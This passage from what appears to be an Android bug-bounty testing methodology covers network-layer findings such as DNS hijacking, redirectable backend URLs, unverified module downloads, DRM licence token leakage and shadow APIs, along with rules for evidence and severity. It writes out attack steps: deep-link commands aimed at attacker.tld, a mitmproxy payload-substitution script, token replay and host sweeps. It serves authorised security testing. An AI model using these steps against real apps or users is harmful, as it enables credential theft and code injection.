grep -rnE 'DnsResolver|InetAddress\.getByName|InetAddress\.getAllByName|okhttp3\.Dns|dnsjava|dnsOverHttps|doh|8\.8\.8\.8|1\.1\.1\.1' jadx_out/sources/ -B4 -A4
adb shell settings get global private_dns_mode
adb shell dumpsys connectivity | grep -iA4 'private dns'
adb shell cmd package list packages --apex-only | grep resolv
adb shell su -c '/data/local/tmp/tcpdump -i any -n port 53 -w /sdcard/dns.pcap'
# hijack a name at the network layer and watch the fallback
dnsmasq -d --address=/cdn.target.tld/192.168.1.66 --address=/analytics.target.tld/192.168.1.66
adb logcat | grep -iE 'SSLHandshake|CertPathValidator|UnknownHost|retry|fallback|http://'
```
- **Proof:** For (a) a plaintext UDP/53 query from the app's UID in the capture while
  `private_dns_mode=hostname` is configured. For (b) the app completing a request against your host for
  a name it does not own, or logcat showing an HTTP retry after the TLS failure you induced.
- **Escalation:** → D14-046 and D17 when the hijacked name serves config, assets or an update. Note that
  Android 16's Local Network Protection can itself break this test — record the API level.
- **Ruled out when:** All resolution goes through `InetAddress`/the platform resolver with no hardcoded
  servers, the DNS pcap is empty while Private DNS is on, and a hijacked secondary name produces a hard
  TLS failure with no HTTP fallback in logcat.

### D14-046 · Backend host derived from a mutable source

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management\|authentication_bypass` (P1) / `sensitive_data_exposure\|disclosure_of_secrets\|for_publicly_accessible_asset` (P1) when the redirected client hands over credentials at scale |
| **Attacker** | AM-09 / AM-06 when the source is network-controlled; AM-03/AM-11 when only locally writable |
| **Applies to** | all |
| **Maps to** | ATT&CK T1637 Dynamic Resolution, T1481.002, T1638; MASWE-0026 |

- **Test:** Is the API base URL fixed at build time, or does it come from a remote config, a push
  payload, a deep link, a DNS record, `shared_prefs`, or an algorithm? A mutable base URL is the single
  point at which an attacker redirects every user's traffic — it is the worst-case version of "no
  pinning" and should be reported jointly with it.
- **How:**
```bash
grep -rn -iE 'baseUrl|BASE_URL|endpoint|Retrofit\.Builder|HttpUrl\.parse|RemoteConfig|getString\("api|FirebaseRemoteConfig' jadx_out/sources/
grep -rn -B10 'Retrofit.Builder\|baseUrl(' jadx_out/sources/ | grep -nE 'getIntent|getQueryParameter|getString|RemoteConfig|prefs'
adb shell "run-as <pkg> cat shared_prefs/*.xml" | grep -i 'http'
# then change it in flight:
#   mitmproxy: rewrite the remote-config response's api_base_url to https://attacker.tld
adb shell am start -a android.intent.action.VIEW -d 'target://config?api=https://attacker.tld'
```
- **Proof:** The app's next request arriving at **your** host with its `Authorization` header attached —
  captured on your listener, not merely observed as a changed preference value.
- **Escalation:** Redirected base URL plus a trusting client is credential harvesting for the whole user
  base. → D13, D15, D17.
- **Ruled out when:** The base URL is a `static final` build constant with no writable override path, no
  remote-config key resolves to a URL, and `shared_prefs` contains no host value that the client reads
  back.

### D14-047 · Executable, module, bundle or security-relevant config fetched without an integrity check

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `insecure_data_transport\|executable_download\|no_secure_integrity_check` (**P4** baseline, CWE-353/354/494, baseline vector `AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N`) → override upward to `server_side_injection\|remote_code_execution_rce` (**P1**) with the execution proof. The sibling `\|secure_integrity_check` is **P5** |
| **Attacker** | AM-06 (MitM) or AM-09 (malicious CDN); AM-01 if the fetch host is takeover-able |
| **Applies to** | all; see D17 for the OTA/dynamic-loading variants |
| **Maps to** | MASWE-0049, CWE-494, MASVS-CODE-4, Mobile Top 10 2024 M2; Google Mobile VRP ACE definition — "Attacker gaining full control of the application, meaning code can be downloaded from the network and executed" |

- **Test:** Watch for `.so`, `.dex`, `.jar`, `.zip`, `.apk`, `.js`/Hermes bundle, `.wasm`, model files or
  a security-relevant JSON config arriving over the network; then substitute the response and see whether
  the app loads it without verifying a signature.
- **How:**
```bash
# what gets fetched
mitmdump -w flows.mitm; mitmdump -nr flows.mitm -q | grep -iE '\.(so|dex|jar|zip|apk|js|bundle|wasm|json)($|\?)'
# what loads it
grep -rn 'DexClassLoader\|PathClassLoader\|InMemoryDexClassLoader\|System.load\|System.loadLibrary\|loadScriptFromFile\|CodePush\|expo-updates' jadx_out/sources/
# is there a signature check on the fetched artefact?
grep -rn 'Signature\.verify\|MessageDigest\|PackageManager.GET_SIGNING_CERTIFICATES\|checkSignatures\|sha256' jadx_out/sources/ -A6
```
  Then substitute with mitmproxy and put a marker in the payload:
```python
def response(flow):
    if flow.request.path.endswith("/update/module.zip"):
        flow.response.content = open("/tmp/evil_module.zip","rb").read()
```
- **Proof:** Your substituted payload executing in the app's process — your own log tag appearing in
  `adb logcat --pid $(adb shell pidof <pkg>)`, or your file written to the app's data directory. A
  changed byte count is not proof; execution is.
- **Escalation:** This is the only route in this chapter to a P1. File it as its own submission and
  cross-reference the transport primitive rather than merging them — one fix equals one bounty.
- **Ruled out when:** Every downloaded artefact is verified against a pinned public key or an embedded
  signature **before** load, demonstrated by substituting a payload and observing a verification failure
  in logcat with the load aborted.

### D14-048 · `DownloadManager` used for security-relevant downloads

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_transport\|executable_download\|no_secure_integrity_check` (P4) for the artefact; `sensitive_data_exposure\|disclosure_of_secrets\|pii_leakage_exposure` (VARIES) for the header disclosure |
| **Attacker** | AM-03 (querying the downloads provider) and AM-06 (tampering the fetch) |
| **Applies to** | all; pre-API-29 also requires `WRITE_EXTERNAL_STORAGE`, widening the exposure |
| **Maps to** | Google risk `unsafe-download-manager` (CVE-2018-9468 permission bypass, CVE-2018-9493 SQL injection, CVE-2018-9546 request-header disclosure of "session cookies, authentication headers"); MobSF `android_download_manager` |

- **Test:** Google's own guidance is to replace `DownloadManager` with Cronet + WorkManager, citing three
  patched Download Provider CVEs and the fact that it parses destinations with `Uri.parse()`, which
  "applies minimal validation on untrusted input". Two questions: does the app attach session headers to
  the request, and where does the file land before it is used?
- **How:**
```bash
grep -rn 'DownloadManager\|DOWNLOAD_SERVICE\|addRequestHeader\|setDestinationIn\|setDestinationUri' jadx_out/sources/ -B4 -A8
# from an unprivileged app / adb as a stand-in for one:
adb shell content query --uri content://downloads/my_downloads
adb shell content query --uri content://downloads/all_downloads
```
- **Proof:** `content query` returning the victim's download rows (URL, title, path) from a process
  holding no permissions, **or** the downloaded artefact landing in a world-accessible external location
  before the app consumes it, **or** an `addRequestHeader("Cookie"/"Authorization", …)` call site.
- **Escalation:** → D17 (unverified downloaded code), → D13 (cookie disclosure), → D07 if the
  destination is a shared provider path another app can write.
- **Ruled out when:** The app uses its own HTTP client writing to app-private storage with a signature
  check before use, or `DownloadManager` is used only for user-initiated, non-security-relevant media
  with no auth headers attached.

### D14-049 · React Native dev bundle server or inspector reachable in a release build

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection\|remote_code_execution_rce` (**P1**) — arbitrary JS with the app's full native-module surface |
| **Attacker** | AM-06 (serves the bundle), AM-03/AM-11 (sets `debug_http_host`) |
| **Applies to** | React Native release builds that still ship `DevSupportManager` wiring |
| **Maps to** | React Native `devsupport/DevServerHelper.kt` — bundle URL `"%s://%s/%s.%s?platform=android&dev=%s&lazy=%s&minify=%s&app=%s&modulesOnly=%s&runModule=%s"`, inspector `"%s://%s/inspector/device?name=%s&app=%s&device=%s&profiling=%b"`, `"%s://%s/open-debugger?device=%s"`; MASWE-0049 |

- **Test:** RN's dev support fetches the JS bundle over plain HTTP from a packager host and exposes
  inspector endpoints. If any of that survives into release, the app executes JS from whatever host it
  is pointed at — and the pointer is a `SharedPreferences` value.
- **How:**
```bash
grep -a -nE 'packager|:8081|/index\.bundle|/open-debugger|/inspector/device|debuggerHost|DevSettings|DevSupportManager' \
  <(strings -a apktool_out/assets/index.android.bundle) jadx_out/sources/ 2>/dev/null
adb shell "run-as <pkg> cat shared_prefs/*.xml" | grep -i 'debug_http_host\|dev_settings'
adb logcat | grep -iE 'ReactNative|DevServer|packager'
adb shell am start -a android.intent.action.VIEW -d "<scheme>://" <pkg>   # then watch for :8081 traffic
```
- **Proof:** The app issuing a request to
  `http://<host>:8081/index.bundle?platform=android&dev=true&…` from a release build, or a reachable
  `/open-debugger` / `/inspector/device` endpoint — then your served bundle executing (log a marker from
  it).
- **Escalation:** → D19 (RN internals), → D17. This is a full ACE with a cleartext delivery path.
- **Ruled out when:** `strings` on the release bundle and the DEX contains no packager/inspector URL
  format strings, `shared_prefs` holds no `debug_http_host`, and a cold start with a hostile DNS answer
  for the packager name produces no :8081 request.

### D14-050 · DRM licence request carrying the app's bearer token to a server-chosen licence URI

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure\|disclosure_of_secrets\|for_publicly_accessible_asset` (P1) when the exfiltrated token is the main session token; High otherwise |
| **Attacker** | AM-09 (playback API / manifest) or AM-02 (deep link that sets the licence URI) |
| **Applies to** | apps with DRM playback (Media3/ExoPlayer + Widevine) |
| **Maps to** | `developer.android.com/media/media3/exoplayer/drm` — `setLicenseUri()`, `setLicenseRequestHeaders(Map<String,String>)`, `setMultiSession()`, `DefaultDrmSessionManager`, `DrmSessionManagerProvider`; MASWE-0026 |

- **Test:** `MediaItem.DrmConfiguration.Builder.setLicenseRequestHeaders()` attaches app headers —
  commonly `Authorization` — to the licence request, and `setLicenseUri()` is frequently taken from the
  manifest, the playback API response, or a deep-link parameter. The licence request goes out on the DRM
  stack's own HTTP client, **outside the app's pin set**, because NSC pins are usually declared
  per-domain rather than on `base-config`.
- **How:**
```bash
grep -rnE 'setLicenseUri|setLicenseRequestHeaders|DrmConfiguration|setForceDefaultLicenseUri|HttpMediaDrmCallback|setDrmSessionManagerProvider|DrmSessionManagerProvider' jadx_out/sources/
grep -rn -B10 'setLicenseUri' jadx_out/sources/ | grep -nE 'getIntent|getQueryParameter|response\.|json'
grep -n 'domain-config\|base-config' apktool_out/res/xml/network_security_config.xml
```
  Then start playback with a manifest or playback response you control and observe the licence POST.
- **Proof:** A licence `POST` arriving at **your** host with the app's `Authorization: Bearer …` header —
  then replay that token against the main API and show a 200 on `/me`. Two captures, one chain.
- **Escalation:** → D13 account access. The same stack also fetches keys named by an HLS `EXT-X-KEY` URI
  — test that path with the same method.
- **Ruled out when:** `setLicenseUri` is a build constant, `setLicenseRequestHeaders` carries no
  credential (or a scoped, short-lived playback token), and the licence host is inside the pin set /
  `base-config`.

### D14-051 · Media manifest, segment or subtitle URL taken from an untrusted source

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (VARIES) for the credentialed fetch; rate the native-parser path on its own crash/impact |
| **Attacker** | AM-02 (deep link, push payload, chat message, QR) |
| **Applies to** | any app with media playback where the source URL is not a fixed allow-list |
| **Maps to** | ExoPlayer/Media3 data-source plumbing (`MediaItem.fromUri`, `DefaultHttpDataSource.setDefaultRequestProperties`, `setSubtitleConfigurations`); MASWE-0026 |

- **Test:** If a deep link, push payload, chat message, scanned QR or WebView bridge can set the player's
  media URL, the media stack fetches an attacker host with the app's cookies, User-Agent and possibly
  `Authorization` — and then parses attacker-controlled container and subtitle bytes in native code.
- **How:**
```bash
grep -rnE 'MediaItem\.fromUri|setMediaItem|createMediaSource|HlsMediaSource|DashMediaSource|ProgressiveMediaSource|setSubtitleConfigurations|DefaultHttpDataSource|setDefaultRequestProperties' jadx_out/sources/
grep -rn -B12 'MediaItem.fromUri' jadx_out/sources/ | grep -nE 'getIntent|getQueryParameter|extras|push'
adb shell am start -a android.intent.action.VIEW \
  -d 'target://play?src=https://attacker.tld/evil.m3u8&sub=https://attacker.tld/a.vtt'
```
- **Proof:** Your host receiving the manifest/segment/subtitle request **with the app's headers**;
  second proof is the app rendering attacker-supplied subtitle content, or crashing in the native
  demuxer on a malformed segment (capture the tombstone).
- **Escalation:** → D09 (deep-link entry point), → D16 (attacker bytes into a native demuxer is a
  0-click media-decode class with a first-party delivery path), → D13 if the fetch carries auth.
- **Ruled out when:** Every media URL originates from a signed/first-party API response and is validated
  against a host allow-list before `MediaItem.fromUri`, and the deep-link probe above produces no
  outbound request to the attacker host.

### D14-052 · Hostile captive portal: a 200 with portal HTML treated as data or as success

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | rated on the consequence; `broken_authentication_and_session_management\|authentication_bypass` (P1) in the rare case where a 200 is read as auth success |
| **Attacker** | AM-06 running the AP |
| **Applies to** | all |
| **Maps to** | not covered by MASTG or the mainstream checklists; Android `NetworkMonitor`/captive-portal validation is the platform side |

- **Test:** Apps launched on a captive-portal network receive HTTP 200s with portal HTML for every
  request. Some parse it as data, cache it, render it in a WebView, or treat a 200 as success on a
  security-relevant step.
- **How:**
```bash
# AP that answers every request with your HTML, DNS wildcarded to it
python3 -m http.server 80          # with an index.html of your choosing
adb shell dumpsys connectivity | grep -iE 'captive|validated|PARTIAL'
adb logcat | grep -iE 'captive|NetworkMonitor|portal'
# then cold-start the app and walk the auth flow
```
- **Proof:** The app rendering your HTML in an in-app WebView, caching it into its data directory, or
  advancing past a step it should have failed — screenshot plus the body you served.
- **Escalation:** → D10 if your HTML lands in a bridged WebView (the bridge finding then has a trivially
  achievable precondition); → D13 if a 200 is read as auth success.
- **Ruled out when:** Every response is validated (content-type, schema, or a signed envelope) before
  use, and the portal test produces a clean error state with nothing cached and nothing rendered.

### D14-053 · Background network restrictions (Android 15) making a security check fail open

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management\|authentication_bypass` (P1) if a revocation or entitlement gate fails open into privileged state |
| **Attacker** | AM-11 / AM-05, exploiting a condition the platform now creates routinely |
| **Applies to** | Android 15+ (all apps) |
| **Maps to** | developer.android.com Android 15 behaviour changes — background network access restrictions; requests started outside a valid process lifecycle throw `UnknownHostException` or a socket `IOException` |

- **Test:** On Android 15 a request started outside a valid process lifecycle fails. Check the error
  handling of any *security-relevant* network call — token revocation, entitlement check, policy fetch,
  remote kill switch. Does the failure path fail open?
- **How:**
```bash
grep -rn 'UnknownHostException' jadx_out/sources/ -A6 | grep -inE 'return true|allow|continue|ENTITLED|granted'
grep -rn 'catch (IOException' jadx_out/sources/ -A6 | grep -inE 'return true|allow|continue|cached'
adb shell am force-stop <pkg>
adb shell cmd deviceidle force-idle
# or simply block the host at the gateway and re-enter the guarded feature
```
- **Proof:** A `catch (IOException) { return ALLOWED; }`-shaped handler on the revocation/entitlement
  path, reached when the platform blocks the background request — demonstrated by blocking the host and
  showing the guarded feature unlocking.
- **Escalation:** → D15, → D23 (business logic). This is the general "fail-open under network denial"
  pattern and the Android 15 change is simply the most reliable way to trigger it.
- **Ruled out when:** Every security-relevant network failure path denies (fails closed), verified by
  blackholing the host at the gateway and observing the feature remain locked.

### D14-054 · Shadow API: every endpoint you recovered from the APK is a version-diff candidate

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management\|authentication_bypass` (**P1**) when the old path skips auth; `broken_access_control\|idor\|view_sensitive_information_iterable_object_identifiers` (P3) upward for field exposure; a version difference alone is **Informational** |
| **Attacker** | AM-01 |
| **Applies to** | any versioned API — which is every mobile backend |
| **Maps to** | corpus `hunt-shadow-api` Stages 1–3 and its severity table; the explicit chain from `apk-redteam-pipeline`. Described there as the highest-value mobile→backend bridge in the repository |

- **Test:** A mobile app's hardcoded backend calls are frequently an **older API version** than the
  current web app uses, with weaker auth, weaker rate limits, weaker input validation and more field
  exposure. This is the reason to decrypt the traffic in the first place — and it is the item that turns
  a P5 pinning bypass into a P1. Diff **behaviourally**, not by response shape.
- **How:**
```bash
# endpoints recovered from the APK (D14-019 + the decrypted proxy history)
for v in v1 v2 v3 v4 beta alpha internal legacy old 2022-01-01 2023-01-01 2024-01-01; do
  curl -s -o /dev/null -w "%{http_code} /api/$v/\n" "https://$TARGET/api/$v/"
done
curl -s -H "X-API-Version: 1" "https://$TARGET/api/users"
curl -s -H "Accept: application/vnd.company.v1+json" "https://$TARGET/api/users"
for sub in api api-v1 api-v2 apiv1 apiv2 legacy-api old-api internal-api staging-api; do
  curl -s -o /dev/null -w "%{http_code} $sub\n" "https://$sub.$TARGET/"
done
```
  Anything other than `404`/connection-refused is live. Then diff four security-relevant behaviours
  between the mobile-era path and the current one, for the **same operation**:
  1. **auth strength** — does the old path accept no token / an expired token / a lower-privilege token
     that the current one rejects?
  2. **rate limiting** — burst both; a missing 429 on the old path means throttling was never backported;
  3. **input validation** — send the same injection or oversized payload to both;
  4. **field exposure** — does the old path return internal ids or PII the current version redacted?
- **Proof:** A security regression on the old path, demonstrated with the **same request** against both
  versions side by side, bodies diffed.
- **Escalation:** → D15. File the primitives first so their ids exist, then the consumer, then backfill
  the cross-references.
- **Ruled out when:** Every non-404 version path returns an identical authorisation decision, the same
  throttling behaviour, the same validation errors and a byte-identical field set for the same operation
  — show the diffs, not the status codes.

### D14-055 · The layer-ordering trap on a "no-auth" endpoint you found by interception

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (kill gate for every auth-bypass claim that starts in this chapter) |
| **Attacker** | n/a |
| **Applies to** | every auth-bypass claim derived from decrypted mobile traffic |
| **Maps to** | corpus `triage-validation` "THE LAYER-ORDERING TRAP" — described there as the single most transferable item in the repository |

- **Test:** A `400 "field X is required"` from an unauthenticated request does **not** prove you passed
  auth. Many stacks run a body parser, schema filter or sanitiser **in front of** the auth middleware, so
  a malformed body is rejected before auth is ever consulted and the response is indistinguishable from
  "auth passed, validation failed". This is the highest-confidence false positive in the class, and it
  is exactly the claim a decrypted mobile endpoint invites.
- **How:**
```bash
curl -s -X POST "https://$TARGET/api/v1/resource" -d '{'
# 400 {"code":"ERR-INPUT-0001","message":"Invalid text. Only permitted characters are allowed"}  <- looks like a bypass

curl -s -X POST "https://$TARGET/api/v1/resource" -H 'Content-Type: application/json' -d '{}'
# 401 {"code":"ERR-AUTH-0001","message":"Not authenticated. Please log in."}   <- the truth
```
- **Proof:** Only the minimal well-formed `{}` tells you where the auth layer sits. If the error text is
  about **input shape or character class** you are talking to a parser. If it names a **domain field**
  (`accountId is required`) *and* a well-formed body still returns it, that is real signal. The same
  reasoning applies to edge/WAF layers: an edge block is not an origin response.
- **Escalation:** n/a — this is a kill gate that prevents a false Critical against production
  infrastructure.
- **Ruled out when:** The minimal well-formed request returns 401/403 — record "layer-ordering trap
  confirmed, no auth bypass" in the ruled-out register rather than silently dropping it.

### D14-056 · Discipline for network sweeps: body diffs, statistics, and counted loops

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (governs D14-021, D14-040, D14-054 and every "bypass" claim in this chapter) |
| **Attacker** | n/a |
| **Applies to** | every automated host/version/header sweep |
| **Maps to** | corpus `bb-methodology` PART 4 (Marker Discipline, Body-Diff Rule, Statistical-Sample Rule, Shell-Loop Ban), `triage-validation` Server-Policy-vs-State |

- **Test:** Four rules, each of which kills a category of false positive that this chapter's tooling
  produces in bulk.
- **How:**
  - **Body-Diff Rule.** A bypass claim requires a response **body** differential, not a status code.
    `diff <(curl -s ...baseline) <(curl -s ...bypass)`. A 200 with a byte-identical body is not a
    bypass. Worked failure from the corpus: `Host: target.example:80@evil.example.com` returned 200
    instead of the baseline 403 — bodies byte-identical at 8,341 bytes both ways, because the load
    balancer had normalised the Host and dropped the `@evil` portion.
  - **Server-Policy-vs-State.** A server-side policy that always denies is not a state oracle. A
    `403 → 200` flip with a spoofed mTLS header is meaningful; a `200` both with and without the header
    means the path was never protected.
  - **Statistical-Sample Rule.** For any timing or rate-limit claim on a decrypted API: **n ≥ 10
    interleaved trials per group**, randomised order, mean/median/σ per group, and a signal requires the
    suspect group's mean to be **≥ 2σ above** the control's. For rate limits, sample 100+ attempts before
    claiming absence and distinguish per-IP / per-account / per-session / per-username throttling.
  - **Shell-Loop Ban.** zsh array expansion fails **silently**; a loop over an unpopulated array produces
    zero iterations with no error and output that looks complete. Anything iterating a list, a file or a
    computed range goes into Python with per-iteration logging. **Always count results: if you expected
    100 probes and got fewer than 50 lines, the loop ate something.**
  - **Marker Discipline.** If you inject a marker into a MitM'd response to prove it reaches a sink, use
    an 8+ character random alphanumeric with no English words (`x4hd2k9pq`, not `test`/`evil`/`payload`)
    and **search the baseline response for the marker first**.
- **Proof:** Distributions, byte-level diffs and result counts in the report — not outliers and not
  status codes.
- **Escalation:** n/a. Multi-tool reproduction bar: before labelling anything Critical or High, reproduce
  through two independent HTTP stacks (curl plus Burp, or Python `requests` plus a raw socket).
- **Ruled out when:** n/a — these are rules, and each finding in this chapter should state which of them
  it survived.

### D14-057 · Evidence hygiene for a network finding

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | every submission out of this chapter |
| **Maps to** | corpus `evidence-hygiene` §§2, 4, 5, 6, 7, 8 |

- **Test:** A transport finding lives or dies on one thing: proving the victim's device was **clean**.
  Build the evidence pack so a triager cannot ask "did you install a CA?".
- **How:**
  - **The clean-trust-store screenshot.** Settings → Security → Trusted credentials → **User**, empty,
    captured in the same session as the intercepted flow, plus
    `adb shell ls /data/misc/user/0/cacerts-added/` returning nothing. Without this, a broken-validation
    finding reads as a pinning report.
  - **Five-screenshot pattern for a state change** (response tampering, forced entitlement, redirected
    base URL): (1) pre-state; (2) **the bug itself** — the tampered request/response; (3) post-state
    negative; (4) post-state positive; (5) the out-of-band side effect (email, push, server-side record).
    Filenames `{finding-#}-step{n}-{description}.png`, referenced by filename in the body. Take them in
    one sitting — reloads regenerate cookies and invalidate earlier captures.
  - **HAR/flow sanitising.**
```bash
jq '.log.entries |= map(
  (.request.headers  |= map(if .name|ascii_downcase|IN("cookie","authorization","x-csrf-token") then .value="<REDACTED>" else . end)) |
  (.response.headers |= map(if .name|ascii_downcase|IN("set-cookie") then .value="<REDACTED>" else . end)) |
  (.request.cookies  |= map(.value="<REDACTED>")) |
  (.response.cookies |= map(.value="<REDACTED>")))' in.har > out.sanitized.har
grep -i 'authorization\|"cookie"' out.sanitized.har | head -20   # verify
```
  - **What to LEAVE visible**, because the triager needs it to correlate with server logs: trace ids
    (`x-request-id`, `x-datadog-trace-id`), bot-management and analytics cookies (`__cf_bm`, `_cfuvid`,
    `_ga`), your own attacker uid, and JSON **key names** (redact values, never the schema). Redact
    session cookies, bearer tokens, CSRF tokens and the victim's PII values.
  - Post-submission, log out and back in to rotate the session and rotate the test-account password, so
    anything visible in a screenshot is already dead.
- **Proof:** A clean artefact set plus the unredacted originals retained locally for verification through
  the platform's private attachment system — never by email.
- **Escalation:** n/a.
- **Ruled out when:** n/a — this is a checklist for the write-up, not a test.

### D14-058 · Severity governance for this chapter

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | every Critical/High claim derived from D14 |
| **Maps to** | corpus `triage-validation` PRE-SEVERITY GATE and RETRACTION DISCIPLINE; `bugcrowd-reporting` §§1–3, §5; HackerOne Platform Standards AITM CVSS `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |

- **Test:** Run the pre-severity gate against the **Critical claim**, not against the bug. Substitute the
  claim into each question: (1) have I validated the FULL chain to attacker-attainable impact, or only
  one primitive in the middle? (2) what does the attacker walk away with, in one concrete sentence?
  (3) have I reproduced the full chain end to end at least twice? (4) is there still a signature check,
  audience check or other gate in the path? (5) has the programme rejected this severity class before?
- **How:**
  - **Pick the VRT that is accurate, then request severity separately.** For a broken-validation MitM the
    node is `insecure_data_transport|cleartext_transmission_of_sensitive_data` (VARIES) and the severity
    argument is HackerOne's own AITM standard vector. Never pick
    `mobile_security_misconfiguration|ssl_certificate_pinning|*` for a validation bug just because it
    mentions certificates — it hard-caps at P5.
  - **Chain-filing order.** File the primitives first so their ids exist, then the consumer, then backfill
    the links in both directions. One fix equals one bounty; a chain is a severity amplifier, not a merge
    request. Do not claim each primitive is independently P1, and do not file everything within minutes
    of each other.
  - **Never write "could potentially", "could be used to", "may allow".** Either demonstrate the impact
    end to end, or downgrade the claim to what you actually showed.
  - **Retraction discipline, both directions.** If a claim fails reproduction, document it in a retraction
    appendix (original signal / disproving evidence / why it looked like a bug / date). But do **not**
    retract a confirmed finding that stopped reproducing because the client patched mid-engagement —
    keep the timestamped pre-patch request/response and say so.
- **Proof:** A findings list where every entry survives the gate, plus a ruled-out register that visibly
  absorbed the rest. A clean report with a retraction appendix is more trustworthy than a longer one that
  falls apart at triage.
- **Escalation:** n/a.
- **Ruled out when:** n/a.

## Graveyard for this domain

| Observation | Why it is not a finding | What would make it one |
|---|---|---|
| "The app does not implement certificate pinning" | `mobile_security_misconfiguration\|ssl_certificate_pinning\|absent` = **P5**. HackerOne Core Ineligible lists "Lack of SSL Pinning" under missing best practices; Xiaomi, Grab, Spotify, Starbucks and Snapchat exclude it by name. Shopify #55644 was rated **none, $0** | An interceptable secret **plus** a realistic AM-06 path — i.e. broken validation (D14-007/-009/-010), an expired pin set (D14-035), or an unpinned channel carrying identifiers (D14-036) |
| "I bypassed the app's pinning with objection/Frida" | `\|ssl_certificate_pinning\|defeatable` = **P5**. HackerOne Platform Standards: "If a report requires an attacker to disable Certificate Pinning in an application, then that is not a valid vulnerability" | Nothing about the bypass. Report what the decrypted traffic then reveals, filed under D15 with its own VRT |
| "Weak TLS ciphers / TLS 1.0 supported" | HackerOne Core Ineligible "SSL/TLS Configurations"; Grab, Reddit, Basecamp and HackenProof all exclude it without a PoC. `server_security_misconfiguration\|insecure_ssl\|*` children are P5 | A captured session actually negotiating the weak parameters **and** a demonstrated decryption or downgrade consequence |
| "Missing HSTS on the auth subdomain" | Exploitation needs an active MitM position you cannot demonstrate remotely; `server_security_misconfiguration\|lack_of_security_headers\|strict_transport_security` = P5 | A demonstrated downgrade of a real session on a network you controlled, with the token captured |
| "Missing CAA / DNSSEC / SPF-DKIM-DMARC" | P5 nodes, and reading `p=none` from `dig` is not a finding | A spoofed mail **delivered to the Inbox** of a real receiver you control, with headers — and even then it belongs to the email domain, not here |
| "`<debug-overrides>` present in the release APK" | The block is inert unless `android:debuggable="true"` — MobSF itself gates the finding on that flag | The store build is also debuggable (→ D14-028) |
| "The app trusts user CAs" on a `targetSdk < 24` build | That is the documented platform default for that target, not a deviation | `targetSdk ≥ 24` with an explicit `<certificates src="user"/>` (→ D14-026), or `overridePins="true"` (→ D14-029) |
| "Cleartext is permitted" on a `targetSdk < 28` build | Default-allow below 28; the attribute's presence proves nothing | Sensitive data observed on the wire (→ D14-018), or an explicit opt-in on a `targetSdk ≥ 28` build |
| "An analytics ping goes over HTTP" | Informational unless it carries something | The ping carries a session token, a stable user id, an advertising id tied to an account, or PII |
| "ARP poisoning lets me intercept the app" | True of every OS, needs same-L2 presence, defeated by Wi-Fi client isolation and MAC randomisation. Use the lab-gateway form purely as a capture mechanism | Nothing — it is not an Android finding. Report the app-side defect the capture revealed |
| "Play Integrity / SafetyNet can be bypassed with Frida" | Verdicts are checked server-side and cannot be forged by a local hook. If the gate is a server-verified attestation, stop and re-scope | The **server** accepting requests carrying no integrity verdict at all — a separate, server-side finding |
| "The interception-detection routine can be defeated" | `lack_of_binary_hardening\|runtime_instrumentation_based` = P5; AM-12 (own rooted device) is not an attacker | Only if a client SoW explicitly buys MAS-R resilience controls — then it is a contractual gap, not a vulnerability |
| "OkHttp version X has CVE-YYYY-NNNN" | `using_components_with_known_vulnerabilities\|outdated_software_version` = P5; a version string is not reachability | The vulnerable code path demonstrably reached — e.g. a manual `HostnameVerifier` call plus an accepted confusable-hostname certificate (→ D14-014) |
| "Traffic fails to intercept, therefore the app pins" | Uniform failure across unrelated hosts including CDNs is your trust store, not the app. On API 34+ the `/system/etc/security/cacerts` push succeeds and changes nothing | A `<pin-set>`/`CertificatePinner` call site **plus** `I/X509Util: … Pin verification failed` in logcat (→ D14-003) |
| "The app ignores the system proxy" | A testability observation, not a vulnerability | The proxy-bypassing client also skipping validation (→ D14-007), or a channel carrying secrets that no review ever covered (→ D14-004) |
| "`<domainEncryption>` is not enabled" | Below API 37 it is disabled by default; the hostname is visible on every other platform too | The hostname itself is the sensitive datum (health, dating, whistleblowing) **and** the app explicitly sets `mode="disabled"` |
| "OAuth `client_secret` is embedded in the APK" | Known and expected for a public client; on the corpus's never-submit list | **PKCE non-enforcement** at the token endpoint — that is the reportable inversion (→ D13) |

## Cross-surface joins

- **NSC pin set × the `SSLSocket`/native channel (D14-010, D14-022, D19).** Nobody reviews the pin set
  and the socket inventory together. NSC pins and NSC cleartext rules cover framework traffic —
  `HttpsURLConnection`, OkHttp, WebView — and cover **neither** `SSLSocket` nor Dart's `HttpClient` nor
  Cronet's own stack. The join is: enumerate every TLS-bearing channel from the pcap, then check each one
  against the pin set and the trust code separately. A vendor's "our NSC is strict" answer closes exactly
  one of them.
- **Cleartext carve-out × OTA / dynamic code loading (D14-017 × D14-047 × D17).** The single domain the
  team allowed cleartext for "because it is just the CDN" is routinely the one serving the JS bundle, the
  feature-flag JSON, the downloadable module or the model file. Read the `<domain-config
  cleartextTrafficPermitted="true">` list against the list of hosts that serve loadable artefacts — the
  intersection is a P4 that argues to P1.
- **Pinned certificate in `assets/` × recon (D14-039 × D01).** The bundled `.cer` names a host by
  construction. Pull its Subject and SANs, feed them into a certificate-transparency search for
  siblings, then sweep the new host for unauthenticated routes. The APK is the only place that internal
  name is published.
- **DRM licence URI × session token (D14-050 × D13).** The media team owns `setLicenseUri`, the auth team
  owns the bearer token, and `setLicenseRequestHeaders` quietly joins them on an HTTP client outside the
  pin set. Nobody reviews the licence request as an auth surface.
- **Deep link × player source / base URL (D09 × D14-046 × D14-051).** The deep-link reviewer checks for
  intent redirection; the network reviewer checks TLS. Neither checks whether a link parameter can set
